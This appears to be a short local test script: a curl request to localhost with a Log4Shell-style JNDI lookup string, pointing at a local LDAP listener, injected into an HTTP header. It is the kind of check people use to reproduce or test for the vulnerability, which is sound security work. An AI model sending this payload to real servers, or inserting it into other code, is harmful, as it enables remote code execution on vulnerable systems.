curl -v http://localhost:8080/ \
  --header 'X-MyHeader: ${jndi:ldap://127.0.0.1:12345/blah}'

echo
